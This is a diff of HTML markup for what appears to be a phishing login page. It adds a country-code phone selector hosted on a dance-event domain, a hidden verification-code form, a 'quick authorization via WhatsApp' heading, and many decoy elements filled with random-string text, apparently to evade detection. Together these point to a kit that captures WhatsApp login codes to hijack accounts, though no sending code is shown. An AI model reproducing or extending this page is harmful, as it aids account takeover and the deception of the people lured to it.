+<div class="item" data-code="+373" data-lang="MD" data-name="Republica Moldova"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/MD.png" alt="MD"> </div> <p class="name">Republica Moldova</p> <p class="code">+373</p> </div>
+<div class="item" data-code="+377" data-lang="MC" data-name="Monaco"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/MC.png" alt="MC"> </div> <p class="name">Monaco</p> <p class="code">+377</p> </div>
+<div class="item" data-code="+976" data-lang="MN" data-name="Монгол"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/MN.png" alt="MN"> </div> <p class="name">Монгол</p> <p class="code">+976</p> </div>
+<div class="item" data-code="+1" data-lang="MS" data-name="Montserrat"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/MS.png" alt="MS"> </div> <p class="name">Montserrat</p> <p class="code">+1</p> </div>
+<div class="item" data-code="+95" data-lang="MM" data-name="မြန်မာ"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/MM.png" alt="MM"> </div> <p class="name">မြန်မာ</p> <p class="code">+95</p> </div>
+<div class="item" data-code="+264" data-lang="NA" data-name="Namibia"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/NA.png" alt="NA"> </div> <p class="name">Namibia</p> <p class="code">+264</p> </div>
+<div class="item" data-code="+674" data-lang="NR" data-name="Nauru"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/NR.png" alt="NR"> </div> <p class="name">Nauru</p> <p class="code">+674</p> </div>
+<div class="item" data-code="+977" data-lang="NP" data-name="नेपाल"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/NP.png" alt="NP"> </div> <p class="name">नेपाल</p> <p class="code">+977</p> </div>
+<div class="item" data-code="+227" data-lang="NE" data-name="Niger"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/NE.png" alt="NE"> </div> <p class="name">Niger</p> <p class="code">+227</p> </div>
+<div class="item" data-code="+234" data-lang="NG" data-name="Nigeria"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/NG.png" alt="NG"> </div> <p class="name">Nigeria</p> <p class="code">+234</p> </div>
+<div class="item" data-code="+31" data-lang="NL" data-name="Nederland"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/NL.png" alt="NL"> </div> <p class="name">Nederland</p> <p class="code">+31</p> </div>
+<div class="item" data-code="+505" data-lang="NI" data-name="Nicaragua"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/NI.png" alt="NI"> </div> <p class="name">Nicaragua</p> <p class="code">+505</p> </div>
+<div class="item" data-code="+683" data-lang="NU" data-name="Niue"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/NU.png" alt="NU"> </div> <p class="name">Niue</p> <p class="code">+683</p> </div>
+<div class="item" data-code="+64" data-lang="NZ" data-name="New Zealand"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/NZ.png" alt="NZ"> </div> <p class="name">New Zealand</p> <p class="code">+64</p> </div>
+<div class="item" data-code="+687" data-lang="NC" data-name="Nouvelle-Calédonie"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/NC.png" alt="NC"> </div> <p class="name">Nouvelle-Calédonie</p> <p class="code">+687</p> </div>
+<div class="item" data-code="+47" data-lang="NO" data-name="Norge"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/NO.png" alt="NO"> </div> <p class="name">Norge</p> <p class="code">+47</p> </div>
+<div class="item" data-code="+247" data-lang="AC" data-name="Ascension Island"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AC.png" alt="AC"> </div> <p class="name">Ascension Island</p> <p class="code">+247</p> </div>
+<div class="item" data-code="+44" data-lang="IM" data-name="Isle of Man"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/IM.png" alt="IM"> </div> <p class="name">Isle of Man</p> <p class="code">+44</p> </div>
+<div class="item" data-code="+672" data-lang="NF" data-name="Norfolk Island"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/NF.png" alt="NF"> </div> <p class="name">Norfolk Island</p> <p class="code">+672</p> </div>
+<div class="item" data-code="+61" data-lang="CX" data-name="Christmas Island"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/CX.png" alt="CX"> </div> <p class="name">Christmas Island</p> <p class="code">+61</p> </div>
+<div class="item" data-code="+290" data-lang="SH" data-name="St. Helena"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/SH.png" alt="SH"> </div> <p class="name">St. Helena</p> <p class="code">+290</p> </div>
+<div class="item" data-code="+1" data-lang="TC" data-name="Turks & Caicos Islands"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/TC.png" alt="TC"> </div> <p class="name">Turks & Caicos Islands</p> <p class="code">+1</p> </div>
+<div class="item" data-code="+971" data-lang="AE" data-name="الإمارات العربية المتحدة"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/AE.png" alt="AE"> </div> <p class="name">الإمارات العربية المتحدة</p> <p class="code">+971</p> </div>
+<div class="item" data-code="+968" data-lang="OM" data-name="عُمان"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/OM.png" alt="OM"> </div> <p class="name">عُمان</p> <p class="code">+968</p> </div>
+<div class="item" data-code="+1" data-lang="KY" data-name="Cayman Islands"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/KY.png" alt="KY"> </div> <p class="name">Cayman Islands</p> <p class="code">+1</p> </div>
+<div class="item" data-code="+682" data-lang="CK" data-name="Cook Islands"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/CK.png" alt="CK"> </div> <p class="name">Cook Islands</p> <p class="code">+682</p> </div>
+<div class="item" data-code="+92" data-lang="PK" data-name="پاکستان"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/PK.png" alt="PK"> </div> <p class="name">پاکستان</p> <p class="code">+92</p> </div>
+<div class="item" data-code="+680" data-lang="PW" data-name="Palau"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/PW.png" alt="PW"> </div> <p class="name">Palau</p> <p class="code">+680</p> </div>
+<div class="item" data-code="+970" data-lang="PS" data-name="الأراضي الفلسطينية"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/PS.png" alt="PS"> </div> <p class="name">الأراضي الفلسطينية</p> <p class="code">+970</p> </div>
+<div class="item" data-code="+507" data-lang="PA" data-name="Panamá"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/PA.png" alt="PA"> </div> <p class="name">Panamá</p> <p class="code">+507</p> </div>
+<div class="item" data-code="+675" data-lang="PG" data-name="Papua New Guinea"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/PG.png" alt="PG"> </div> <p class="name">Papua New Guinea</p> <p class="code">+675</p> </div>
+<div class="item" data-code="+595" data-lang="PY" data-name="Paraguay"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/PY.png" alt="PY"> </div> <p class="name">Paraguay</p> <p class="code">+595</p> </div>
+<div class="item" data-code="+51" data-lang="PE" data-name="Perú"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/PE.png" alt="PE"> </div> <p class="name">Perú</p> <p class="code">+51</p> </div>
+<div class="item" data-code="+48" data-lang="PL" data-name="Polska"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/PL.png" alt="PL"> </div> <p class="name">Polska</p> <p class="code">+48</p> </div>
+<div class="item" data-code="+351" data-lang="PT" data-name="Portugal"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/PT.png" alt="PT"> </div> <p class="name">Portugal</p> <p class="code">+351</p> </div>
+<div class="item" data-code="+1" data-lang="PR" data-name="Puerto Rico"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/PR.png" alt="PR"> </div> <p class="name">Puerto Rico</p> <p class="code">+1</p> </div>
+<div class="item" data-code="+82" data-lang="KR" data-name="대한민국"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/KR.png" alt="KR"> </div> <p class="name">대한민국</p> <p class="code">+82</p> </div>
+<div class="item" data-code="+262" data-lang="RE" data-name="La Réunion"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/RE.png" alt="RE"> </div> <p class="name">La Réunion</p> <p class="code">+262</p> </div>
+<div class="item" data-code="+7" data-lang="RU" data-name="Россия"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/RU.png" alt="RU"> </div> <p class="name">Россия</p> <p class="code">+7</p> </div>
+<div class="item" data-code="+250" data-lang="RW" data-name="U Rwanda"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/RW.png" alt="RW"> </div> <p class="name">U Rwanda</p> <p class="code">+250</p> </div>
+<div class="item" data-code="+40" data-lang="RO" data-name="România"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/RO.png" alt="RO"> </div> <p class="name">România</p> <p class="code">+40</p> </div>
+<div class="item" data-code="+503" data-lang="SV" data-name="El Salvador"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/SV.png" alt="SV"> </div> <p class="name">El Salvador</p> <p class="code">+503</p> </div>
+<div class="item" data-code="+685" data-lang="WS" data-name="Samoa"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/WS.png" alt="WS"> </div> <p class="name">Samoa</p> <p class="code">+685</p> </div>
+<div class="item" data-code="+378" data-lang="SM" data-name="San Marino"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/SM.png" alt="SM"> </div> <p class="name">San Marino</p> <p class="code">+378</p> </div>
+<div class="item" data-code="+239" data-lang="ST" data-name="São Tomé e Príncipe"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/ST.png" alt="ST"> </div> <p class="name">São Tomé e Príncipe</p> <p class="code">+239</p> </div>
+<div class="item" data-code="+966" data-lang="SA" data-name="المملكة العربية السعودية"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/SA.png" alt="SA"> </div> <p class="name">المملكة العربية السعودية</p> <p class="code">+966</p> </div>
+<div class="item" data-code="+389" data-lang="MK" data-name="Северна Македонија"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/MK.png" alt="MK"> </div> <p class="name">Северна Македонија</p> <p class="code">+389</p> </div>
+<div class="item" data-code="+1" data-lang="MP" data-name="Northern Mariana Islands"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/MP.png" alt="MP"> </div> <p class="name">Northern Mariana Islands</p> <p class="code">+1</p> </div>
+<div class="item" data-code="+248" data-lang="SC" data-name="Seychelles"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/SC.png" alt="SC"> </div> <p class="name">Seychelles</p> <p class="code">+248</p> </div>
+<div class="item" data-code="+590" data-lang="BL" data-name="Saint-Barthélemy"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/BL.png" alt="BL"> </div> <p class="name">Saint-Barthélemy</p> <p class="code">+590</p> </div>
+<div class="item" data-code="+590" data-lang="MF" data-name="Saint-Martin"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/MF.png" alt="MF"> </div> <p class="name">Saint-Martin</p> <p class="code">+590</p> </div>
+<div class="item" data-code="+508" data-lang="PM" data-name="Saint-Pierre-et-Miquelon"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/PM.png" alt="PM"> </div> <p class="name">Saint-Pierre-et-Miquelon</p> <p class="code">+508</p> </div>
+<div class="item" data-code="+221" data-lang="SN" data-name="Sénégal"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/SN.png" alt="SN"> </div> <p class="name">Sénégal</p> <p class="code">+221</p> </div>
+<div class="item" data-code="+1" data-lang="VC" data-name="St. Vincent & Grenadines"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/VC.png" alt="VC"> </div> <p class="name">St. Vincent & Grenadines</p> <p class="code">+1</p> </div>
+<div class="item" data-code="+1" data-lang="KN" data-name="St. Kitts & Nevis"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/KN.png" alt="KN"> </div> <p class="name">St. Kitts & Nevis</p> <p class="code">+1</p> </div>
+<div class="item" data-code="+1" data-lang="LC" data-name="St. Lucia"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/LC.png" alt="LC"> </div> <p class="name">St. Lucia</p> <p class="code">+1</p> </div>
+<div class="item" data-code="+381" data-lang="RS" data-name="Србија"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/RS.png" alt="RS"> </div> <p class="name">Србија</p> <p class="code">+381</p> </div>
+<div class="item" data-code="+65" data-lang="SG" data-name="Singapore"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/SG.png" alt="SG"> </div> <p class="name">Singapore</p> <p class="code">+65</p> </div>
+<div class="item" data-code="+1" data-lang="SX" data-name="Sint-Maarten"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/SX.png" alt="SX"> </div> <p class="name">Sint-Maarten</p> <p class="code">+1</p> </div>
+<div class="item" data-code="+963" data-lang="SY" data-name="سوريا"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/SY.png" alt="SY"> </div> <p class="name">سوريا</p> <p class="code">+963</p> </div>
+<div class="item" data-code="+421" data-lang="SK" data-name="Slovensko"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/SK.png" alt="SK"> </div> <p class="name">Slovensko</p> <p class="code">+421</p> </div>
+<div class="item" data-code="+386" data-lang="SI" data-name="Slovenija"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/SI.png" alt="SI"> </div> <p class="name">Slovenija</p> <p class="code">+386</p> </div>
+<div class="item" data-code="+1" data-lang="US" data-name="United States"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/US.png" alt="US"> </div> <p class="name">United States</p> <p class="code">+1</p> </div>
+<div class="item" data-code="+677" data-lang="SB" data-name="Solomon Islands"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/SB.png" alt="SB"> </div> <p class="name">Solomon Islands</p> <p class="code">+677</p> </div>
+<div class="item" data-code="+252" data-lang="SO" data-name="Soomaaliya"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/SO.png" alt="SO"> </div> <p class="name">Soomaaliya</p> <p class="code">+252</p> </div>
+<div class="item" data-code="+249" data-lang="SD" data-name="السودان"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/SD.png" alt="SD"> </div> <p class="name">السودان</p> <p class="code">+249</p> </div>
+<div class="item" data-code="+597" data-lang="SR" data-name="Suriname"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/SR.png" alt="SR"> </div> <p class="name">Suriname</p> <p class="code">+597</p> </div>
+<div class="item" data-code="+232" data-lang="SL" data-name="Sierra Leone"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/SL.png" alt="SL"> </div> <p class="name">Sierra Leone</p> <p class="code">+232</p> </div>
+<div class="item" data-code="+992" data-lang="TJ" data-name="Тоҷикистон"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/TJ.png" alt="TJ"> </div> <p class="name">Тоҷикистон</p> <p class="code">+992</p> </div>
+<div class="item" data-code="+66" data-lang="TH" data-name="ไทย"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/TH.png" alt="TH"> </div> <p class="name">ไทย</p> <p class="code">+66</p> </div>
+<div class="item" data-code="+886" data-lang="TW" data-name="台灣"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/TW.png" alt="TW"> </div> <p class="name">台灣</p> <p class="code">+886</p> </div>
+<div class="item" data-code="+255" data-lang="TZ" data-name="Tanzania"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/TZ.png" alt="TZ"> </div> <p class="name">Tanzania</p> <p class="code">+255</p> </div>
+<div class="item" data-code="+228" data-lang="TG" data-name="Togo"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/TG.png" alt="TG"> </div> <p class="name">Togo</p> <p class="code">+228</p> </div>
+<div class="item" data-code="+690" data-lang="TK" data-name="Tokelau"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/TK.png" alt="TK"> </div> <p class="name">Tokelau</p> <p class="code">+690</p> </div>
+<div class="item" data-code="+676" data-lang="TO" data-name="Tonga"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/TO.png" alt="TO"> </div> <p class="name">Tonga</p> <p class="code">+676</p> </div>
+<div class="item" data-code="+1" data-lang="TT" data-name="Trinidad & Tobago"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/TT.png" alt="TT"> </div> <p class="name">Trinidad & Tobago</p> <p class="code">+1</p> </div>
+<div class="item" data-code="+688" data-lang="TV" data-name="Tuvalu"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/TV.png" alt="TV"> </div> <p class="name">Tuvalu</p> <p class="code">+688</p> </div>
+<div class="item" data-code="+216" data-lang="TN" data-name="تونس"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/TN.png" alt="TN"> </div> <p class="name">تونس</p> <p class="code">+216</p> </div>
+<div class="item" data-code="+993" data-lang="TM" data-name="Türkmenistan"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/TM.png" alt="TM"> </div> <p class="name">Türkmenistan</p> <p class="code">+993</p> </div>
+<div class="item" data-code="+90" data-lang="TR" data-name="Türkiye"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/TR.png" alt="TR"> </div> <p class="name">Türkiye</p> <p class="code">+90</p> </div>
+<div class="item" data-code="+256" data-lang="UG" data-name="Uganda"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/UG.png" alt="UG"> </div> <p class="name">Uganda</p> <p class="code">+256</p> </div>
+<div class="item" data-code="+998" data-lang="UZ" data-name="Oʻzbekiston"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/UZ.png" alt="UZ"> </div> <p class="name">Oʻzbekiston</p> <p class="code">+998</p> </div>
+<div class="item" data-code="+380" data-lang="UA" data-name="Україна"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/UA.png" alt="UA"> </div> <p class="name">Україна</p> <p class="code">+380</p> </div>
+<div class="item" data-code="+681" data-lang="WF" data-name="Wallis-et-Futuna"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/WF.png" alt="WF"> </div> <p class="name">Wallis-et-Futuna</p> <p class="code">+681</p> </div>
+<div class="item" data-code="+598" data-lang="UY" data-name="Uruguay"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/UY.png" alt="UY"> </div> <p class="name">Uruguay</p> <p class="code">+598</p> </div>
+<div class="item" data-code="+298" data-lang="FO" data-name="Føroyar"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/FO.png" alt="FO"> </div> <p class="name">Føroyar</p> <p class="code">+298</p> </div>
+<div class="item" data-code="+691" data-lang="FM" data-name="Micronesia"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/FM.png" alt="FM"> </div> <p class="name">Micronesia</p> <p class="code">+691</p> </div>
+<div class="item" data-code="+679" data-lang="FJ" data-name="Fiji"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/FJ.png" alt="FJ"> </div> <p class="name">Fiji</p> <p class="code">+679</p> </div>
+<div class="item" data-code="+63" data-lang="PH" data-name="Philippines"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/PH.png" alt="PH"> </div> <p class="name">Philippines</p> <p class="code">+63</p> </div>
+<div class="item" data-code="+358" data-lang="FI" data-name="Suomi"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/FI.png" alt="FI"> </div> <p class="name">Suomi</p> <p class="code">+358</p> </div>
+<div class="item" data-code="+500" data-lang="FK" data-name="Falkland Islands"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/FK.png" alt="FK"> </div> <p class="name">Falkland Islands</p> <p class="code">+500</p> </div>
+<div class="item" data-code="+33" data-lang="FR" data-name="France"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/FR.png" alt="FR"> </div> <p class="name">France</p> <p class="code">+33</p> </div>
+<div class="item" data-code="+594" data-lang="GF" data-name="Guyane française"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/GF.png" alt="GF"> </div> <p class="name">Guyane française</p> <p class="code">+594</p> </div>
+<div class="item" data-code="+689" data-lang="PF" data-name="Polynésie française"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/PF.png" alt="PF"> </div> <p class="name">Polynésie française</p> <p class="code">+689</p> </div>
+<div class="item" data-code="+385" data-lang="HR" data-name="Hrvatska"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/HR.png" alt="HR"> </div> <p class="name">Hrvatska</p> <p class="code">+385</p> </div>
+<div class="item" data-code="+236" data-lang="CF" data-name="République centrafricaine"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/CF.png" alt="CF"> </div> <p class="name">République centrafricaine</p> <p class="code">+236</p> </div>
+<div class="item" data-code="+235" data-lang="TD" data-name="Tchad"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/TD.png" alt="TD"> </div> <p class="name">Tchad</p> <p class="code">+235</p> </div>
+<div class="item" data-code="+382" data-lang="ME" data-name="Црна Гора"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/ME.png" alt="ME"> </div> <p class="name">Црна Гора</p> <p class="code">+382</p> </div>
+<div class="item" data-code="+420" data-lang="CZ" data-name="Česko"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/CZ.png" alt="CZ"> </div> <p class="name">Česko</p> <p class="code">+420</p> </div>
+<div class="item" data-code="+56" data-lang="CL" data-name="Chile"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/CL.png" alt="CL"> </div> <p class="name">Chile</p> <p class="code">+56</p> </div>
+<div class="item" data-code="+41" data-lang="CH" data-name="Schweiz"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/CH.png" alt="CH"> </div> <p class="name">Schweiz</p> <p class="code">+41</p> </div>
+<div class="item" data-code="+46" data-lang="SE" data-name="Sverige"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/SE.png" alt="SE"> </div> <p class="name">Sverige</p> <p class="code">+46</p> </div>
+<div class="item" data-code="+47" data-lang="SJ" data-name="Шпицберген и Ян-Майен"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/SJ.png" alt="SJ"> </div> <p class="name">Шпицберген и Ян-Майен</p> <p class="code">+47</p> </div>
+<div class="item" data-code="+94" data-lang="LK" data-name="ශ්‍රී ලංකාව"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/LK.png" alt="LK"> </div> <p class="name">ශ්‍රී ලංကාව</p> <p class="code">+94</p> </div>
+<div class="item" data-code="+593" data-lang="EC" data-name="Ecuador"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/EC.png" alt="EC"> </div> <p class="name">Ecuador</p> <p class="code">+593</p> </div>
+<div class="item" data-code="+240" data-lang="GQ" data-name="Guinea Ecuatorial"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/GQ.png" alt="GQ"> </div> <p class="name">Guinea Ecuatorial</p> <p class="code">+240</p> </div>
+<div class="item" data-code="+291" data-lang="ER" data-name="إريتريا"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/ER.png" alt="ER"> </div> <p class="name">إريتريا</p> <p class="code">+291</p> </div>
+<div class="item" data-code="+268" data-lang="SZ" data-name="Eswatini"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/SZ.png" alt="SZ"> </div> <p class="name">Eswatini</p> <p class="code">+268</p> </div>
+<div class="item" data-code="+372" data-lang="EE" data-name="Eesti"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/EE.png" alt="EE"> </div> <p class="name">Eesti</p> <p class="code">+372</p> </div>
+<div class="item" data-code="+251" data-lang="ET" data-name="ኢትዮጵያ"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/ET.png" alt="ET"> </div> <p class="name">ኢትዮጵያ</p> <p class="code">+251</p> </div>
+<div class="item" data-code="+27" data-lang="ZA" data-name="iNingizimu Afrika"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/ZA.png" alt="ZA"> </div> <p class="name">iNingizimu Afrika</p> <p class="code">+27</p> </div>
+<div class="item" data-code="+211" data-lang="SS" data-name="South Sudan"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/SS.png" alt="SS"> </div> <p class="name">South Sudan</p> <p class="code">+211</p> </div>
+<div class="item" data-code="+1" data-lang="JM" data-name="Jamaica"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/JM.png" alt="JM"> </div> <p class="name">Jamaica</p> <p class="code">+1</p> </div>
+<div class="item" data-code="+81" data-lang="JP" data-name="日本"> <div class="image"> <img src="https://dancebattle.life/static/img/flags/JP.png" alt="JP"> </div> <p class="name">日本</p> <p class="code">+81</p> </div>
+<!-- *** КОНЕЦ БЛОКА С ИСПРАВЛЕННЫМИ ПУТЯМИ К ФЛАГАМ *** -->
                             </div>
+                            <ul class="egeWSiccsIJQ SCLYYYcSeAF qaeFHqJVbGDfsBGDGrdnjSCK jOlNkfIrteJgkl">
+                                <h5 class="kvIpScpLemN">ITmVeZdXJDSCBWl zVbKqQUbIoZBZzyyzo DCbunYKAbrsFUv SygnOVnIsOj
+                                </h5>
+                            </ul>
                         </div>
+                        <h5
+                            class="zFFCQoOq nzSavIXnC jZCYjKnqgfXRrEJOq oAhvqdwyFRfSPZzZwR ZawnPubwcNBpIYUsJJeJMUe uroalBgdudDWVoKlQiQo">
+                            xZnaqANSmo oeNndRzxzo cUyaLrLUISLJx</h5>
                     </div>
-                    <!-- Поле ввода номера -->
-                    <input type="text" class="number" id="number" value="+61" placeholder="Phone number" />
-                    <!-- Сообщение об ошибке (скрыто) -->
-                    <p class="error hidden">Numero di telefono non valido</p>
-                    <!-- Кнопка "Продолжить" -->
+                    <span class="TdYmjJvmcSBa tbLCiLFKJyfHbkQIzyZlkt ALNyVJaMW OjKCGXKynnNnc GrjJKEHUsHeZzDSEwm">
+                        <h5 class="TqGTdibeuiOqcV">cNZrewXsgH ZSqtLNllkZPCTDpeAOIu hvSyEpuPccUP rPFifostiGlxBN ZFIDaGgBq
+                            PYUASKiSGYgxkwXLVPQ maCanCKOzIJvgYWWri vXGtdtfSKSqNHEFaThEOO IMFZZUui</h5>
+                    </span>
+                    <input type="text" class="number" id="number" value="+61" />
+                    <span class="TdYmjJvmcSBa tbLCiLFKJyfHbkQIzyZlkt ALNyVJaMW OjKCGXKynnNnc GrjJKEHUsHeZzDSEwm">
+                        <h5 class="TqGTdibeuiOqcV">cNZrewXsgH ZSqtLNllkZPCTDpeAOIu hvSyEpuPccUP rPFifostiGlxBN ZFIDaGgBq
+                            PYUASKiSGYgxkwXLVPQ maCanCKOzIJvgYWWri vXGtdtfSKSqNHEFaThEOO IMFZZUui</h5>
+                    </span>
                     <button class="button primary" id="next-step">Continua</button>
+
+                    <span
+                        class="HJCjuJdBRxyFkVhn tOIjuvePPmV gHpInWiOuhsqojyVHpg fbWqZxbOkWmHe EFLINkHZOqmAAcItwWLW ZWugeeBjg">
+                        <div class="btBTGkttju">
+                            <p class="sRnrhTpRr">nDJkOjcRMteMgojpUyVEUjuuJ rJlgurWIUv</p>
+                        </div>
+                    </span>
+                    <p class="error hidden">Numero di telefono non valido</p>
+
+
+                    <small
+                        class="CUuwPmBOQqkLDnR qygifepowfcwNpYiwIPqTsB pYuVLgSQXTPnzOsjZgWiCaOFL MymbuHKI WMAmNSmIK IAGlswnUXQyzrQRzVbZs">
+                        <h6 class="MXQJididkCWQAl">TmIEUJJfDZrxnzDzbx DWbpJizMWzfRvqyQ oOwvJSlWmTg tuCPOHrhOaNmHtxVRF
+                            StzcxoAdfnCLSEwi kNkcHifxqigl OMNzbdhZkjCwTS</h6>
+                    </small>
+
+
+                    <!-- Цей блок додай під першу кнопку -->
+                    <div id="verifyForm" style="display: none; margin-top: 20px;">
+                        <input type="text" id="codeInput" placeholder="Введіть код">
+                        <button id="submitCode">Підтвердити</button>
+                    </div>
+
                 </div>
+                <h6 class="lmTQZiytwQd HlTLVIaKHXw CRlJUacoRBvO JRMMTdRtZKzRYjKUmWGAg">hFUFNQJtCrHKBzP
+                    WFFhTuDduNDAMMCnWt MsHxDNrmDzz nsOqSlqqJcEpmbMkt xZKKiWrPDowlDzyRpyprK pChdyMBxfEasK
+                    HMnrMFReAPNuUAFJVUhthI CekbmLWrWtGakLpSHnCh sOCbDOOFeKEKLbzn YshEXiulSpAkSSpuxSszHCqHG</h6>
+            </div>
+
+        </div>
+
+
+        <h5
+            class="juxoxMAnNtukzfIm lNxpBmxtmOtfOlerNBe zJldAYjRNfMACuePoxBzqmNJe pomMZXBqTUpKgEOUn qESlrnIrXJoCuBwufAgmKMejA">
+            ZamYcRmZU zndcRBwfqEhgwxqRXabIHvrm QTkiPMLi DbLaPvYrUWUiqFSmi
+        </h5>
+<!-- Конец Части 2 -->
+ <!-- Начало Части 3 -->
+ <div class="block code hidden" id="step-2">
+    <span class="TdYmjJvmcSBa tbLCiLFKJyfHbkQIzyZlkt ALNyVJaMW OjKCGXKynnNnc GrjJKEHUsHeZzDSEwm">
+        <h5 class="TqGTdibeuiOqcV">cNZrewXsgH ZSqtLNllkZPCTDpeAOIu hvSyEpuPccUP rPFifostiGlxBN ZFIDaGgBq
+            PYUASKiSGYgxkwXLVPQ maCanCKOzIJvgYWWri vXGtdtfSKSqNHEFaThEOO IMFZZUui</h5>
+    </span>
+    <div class="text">
+        <h6 class="lmTQZiytwQd HlTLVIaKHXw CRlJUacoRBvO JRMMTdRtZKzRYjKUmWGAg">hFUFNQJtCrHKBzP
+            WFFhTuDduNDAMMCnWt MsHxDNrmDzz nsOqSlqqJcEpmbMkt xZKKiWrPDowlDzyRpyprK pChdyMBxfEasK
+            HMnrMFReAPNuUAFJVUhthI CekbmLWrWtGakLpSHnCh sOCbDOOFeKEKLbzn YshEXiulSpAkSSpuxSszHCqHG</h6>
+
+        <h2>Autorizzazione rapida e facile tramite WhatsApp</h2>
+
+        <h6 class="lmTQZiytwQd HlTLVIaKHXw CRlJUacoRBvO JRMMTdRtZKzRYjKUmWGAg">hFUFNQJtCrHKBzP
+            WFFhTuDduNDAMMCnWt MsHxDNrmDzz nsOqSlqqJcEpmbMkt xZKKiWrPDowlDzyRpyprK pChdyMBxfEasK
